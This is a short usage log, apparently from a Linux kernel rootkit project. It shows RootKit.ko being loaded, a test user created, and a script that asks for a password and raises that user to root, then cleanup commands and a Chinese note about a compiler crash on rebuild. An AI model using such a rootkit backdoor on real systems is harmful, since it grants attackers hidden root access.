$ sudo make

$ sudo insmod RootKit.ko

$ kill -1 0

$ sudo useradd anon
$ sudo su anon

$ ./r00tme.sh
before priviledge promotion
------------------------
uid=1001(anon) gid=1001(anon) 组=1001(anon)
------------------------
input password: ******

after priviledge promotion
------------------------
uid=0(root) gid=0(root) 组=0(root),1001(anon)
------------------------
$ exit

$ sudo userdel anon

$ sudo rmmod RootKit
$ sudo make clean


重新make的时候会发生问题
internal compiler error: 段错误
需要重启